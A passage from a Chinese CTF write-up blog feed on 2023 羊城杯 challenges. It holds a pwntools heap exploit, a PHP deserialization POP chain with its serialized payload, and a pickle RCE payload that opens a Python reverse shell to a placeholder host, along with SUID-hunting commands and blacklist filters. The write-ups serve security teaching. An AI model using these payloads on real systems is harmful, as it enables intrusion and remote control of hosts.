class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&quot;./pwn2lib&quot;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x508</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x518</span>)<br><br><span class="hljs-comment"># one</span><br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>lbin=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=lbin-<span class="hljs-number">0x40</span>-<span class="hljs-number">62</span>*<span class="hljs-number">0x10</span>-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x1f6830</span>-<span class="hljs-number">0x430</span><br>success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;libc.address=:x&#125;</span>&quot;</span>)<br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>edit(<span class="hljs-number">2</span>,p64(lbin)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x404140</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br><br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>chunk0=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk0=:x&#125;</span>&quot;</span>)<br><br>fc=<span class="hljs-number">0x4040e0</span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x508</span>)<br><br>payload=flat(&#123;<span class="hljs-number">0</span>:[<span class="hljs-number">0</span>,<span class="hljs-number">0x501</span>,fc-<span class="hljs-number">0x18</span>,fc-<span class="hljs-number">0x10</span>],<span class="hljs-number">0x500</span>:[<span class="hljs-number">0x500</span>,<span class="hljs-number">0x520</span>]&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x4040e0</span>)*<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x404000</span>))<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x4011d6</span>))<br>free(<span class="hljs-number">1</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Fix-7"><a href="#Fix-7" class="headerlink" title="Fix"></a>Fix</h2><p>修改plt表中的free函数项，使其在执行时跳转到自己构造的指令位置，用于执行free函数并将指针数组中被释放的chunk的地址设置为NULL</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-Printf%20but%20not%20fmtstr.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Break和Fix阶段都是小组第一&lt;/p&gt;
&lt;p&gt;比赛的时候没写wp，&lt;strong&gt;赛后复现&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;web-ezSSTI&quot;&gt;&lt;a href=&quot;#web-ezSSTI&quot; class=&quot;headerlink&quot; title=&quot;web-ezSS</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
    <category term="awdp" scheme="https://www.dr0n.top/tags/awdp/"/>
    
    <category term="羊城杯" scheme="https://www.dr0n.top/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>2023羊城杯初赛misc&amp;web wp</title>
    <link href="https://www.dr0n.top/posts/58b7474e/"/>
    <id>https://www.dr0n.top/posts/58b7474e/</id>
    <published>2023-09-03T05:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.927Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><p>访问<code>/p0p.php</code>，返回一个<code>hint.zip</code></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">vO</span> <span class="hljs-variable">Ow0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> Ö<span class="hljs-type">_O</span> Ö<span class="hljs-operator">.</span><span class="hljs-built_in">O</span> <span class="hljs-type">o_o</span> <span class="hljs-number">0.</span><span class="hljs-built_in">O</span> <span class="hljs-variable">OvO</span> <span class="hljs-variable">o</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> <span class="hljs-variable">o</span><span class="hljs-operator">.</span>Ö Ö<span class="hljs-operator">.</span>Ö <span class="hljs-variable">Ovo</span> <span class="hljs-number">0</span><span class="hljs-type">_</span>Ö Ö<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ö<span class="hljs-type">_o</span> <span class="hljs-variable">owO</span> <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-variable">owo</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-number">0</span><span class="hljs-variable">w</span>Ö <span class="hljs-built_in">O</span><span class="hljs-number">.0</span> <span class="hljs-number">0</span><span class="hljs-variable">w0</span> Ö<span class="hljs-type">_</span><span class="hljs-number">0</span> <span class="hljs-variable">OwO</span> <span class="hljs-variable">ov0</span> <span class="hljs-variable">owo</span> <span class="hljs-type">o_O</span> <span class="hljs-built_in">O</span><span class="hljs-operator">.</span>Ö Ö<span class="hljs-variable">vo</span><br></code></pre></td></tr></table></figure><p><a href="https://zdjd.vercel.app/">尊嘟假嘟翻译器O.o</a>得到<code>flag在/tmp/catcatf1ag.txt</code></p><p>利用  <a href="http://www.gem-love.com/2023/02/04/PHP-7-4-21-Development-Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</a>  得到源码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 302 found&quot;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pro</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rce2</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$rce2</span>=<span class="hljs-variable language_">$this</span>-&gt;exp[<span class="hljs-variable">$rce2</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>     &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yang</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ycb</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;now = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = True;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheng</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bei</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;CTF-&gt;<span class="hljs-title function_ invoke__">ycb</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;fine-&gt;<span class="hljs-title function_ invoke__">YCB1</span>(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prohib</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CTF&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">prohib</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一个php反序列化，从hint中得知flag位置不在根目录，所以<code>Pro</code>类可以舍弃<br>发现敏感函数<code>call_user_func</code>，所以最终应该要调用<code>__call</code>，而在<code>Bei</code>中<code>__destruct()</code>存在函数调用，poc如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bei</span>();<br><br><span class="hljs-variable">$a</span> -&gt; CTF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><br><br><span class="hljs-variable">$a</span> -&gt; fine = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; rce = <span class="hljs-string">&quot;/tmp/catcatf1ag.txt&quot;</span>;<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; now = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;YCB1&quot;</span>=&gt;<span class="hljs-string">&quot;highlight_file&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><code>O%3A3%3A%22Bei%22%3A3%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A14%3A%22highlight_file%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3B%7D</code></p><p>最后那个过滤用<code>highlight_file</code>函数或者双写都可以绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-2.png"></p><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p><a href="http://www.zip下载源码/">www.zip下载源码</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> secret<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/verification&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verification</span>():<br>    <span class="hljs-keyword">try</span>:<br>        attribute = session.get(<span class="hljs-string">&#x27;Attribute&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(attribute, <span class="hljs-built_in">dict</span>):<br>            <span class="hljs-keyword">raise</span> Exception<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hacker!!!&#x27;</span><br>    <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;name&#x27;</span>) == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> secret<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Don&#x27;t play tricks on me&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are a perfect stranger to me&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>访问<code>/verification</code>，进行session伪造，得到<code>Hello admin, welcome to /ppppppppppick1e</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-3.png"></p><p>访问<code>/ppppppppppick1e</code>，得到<code>Hint: Source in /src0de</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src0de&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src0de</span>():<br>    f = <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    rsp = f.read()<br>    f.close()<br>    <span class="hljs-keyword">return</span> rsp[rsp.index(<span class="hljs-string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppppppppppick1e</span>():<br>    <span class="hljs-keyword">try</span>:<br>        username = <span class="hljs-string">&quot;admin&quot;</span><br>        rsp = make_response(<span class="hljs-string">&quot;Hello, %s &quot;</span> % username)<br>        rsp.headers[<span class="hljs-string">&#x27;hint&#x27;</span>] = <span class="hljs-string">&quot;Source in /src0de&quot;</span><br>        pick1e = request.cookies.get(<span class="hljs-string">&#x27;pick1e&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pick1e <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            pick1e = base64.b64decode(pick1e)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> rsp<br>        <span class="hljs-keyword">if</span> check(pick1e):<br>            pick1e = pickle.loads(pick1e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Go for it!!!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Way!!!&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-built_in">str</span>(e)<br>        <span class="hljs-keyword">return</span> error_message<br><br>    <span class="hljs-keyword">return</span> rsp<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GWHT</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>pickle反序列化rce</p><p>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>payload= <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;,port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br></code></pre></td></tr></table></figure><p>发现没有权限</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-4.png"></p><p>查找有权限的命令</p><p><code>find /bin/ -perm 777</code>或者<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>发现python3有权限，使用python3读flag<br><code>python3 -c &#39;print(open(&quot;/flag&quot;).read())&#39;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-web-5.png"></p><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] =<span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>)+<span class="hljs-string">&quot;Boogipopisweak&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name=request.args.get(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>)<br>    m1sery=[request.args.get(<span class="hljs-string">&quot;m1sery&quot;</span>,<span class="hljs-string">&quot;Doctor.Boogipop&quot;</span>)]<br>    <span class="hljs-keyword">if</span>(session.get(<span class="hljs-string">&quot;name&quot;</span>)==<span class="hljs-string">&quot;Dr.Boog1pop&quot;</span>):<br>        blacklist=re.findall(<span class="hljs-string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker no way&quot;</span><br>        <span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;for [<span class="hljs-subst">&#123;name&#125;</span>] in [<span class="hljs-subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;Doctor&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,name=session.get(<span class="hljs-string">&quot;name&quot;</span>))<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>        file = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>        fileblacklist=re.findall(<span class="hljs-string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> fileblacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker!&quot;</span><br>        start=request.args.get(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        end=request.args.get(<span class="hljs-string">&quot;end&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        <span 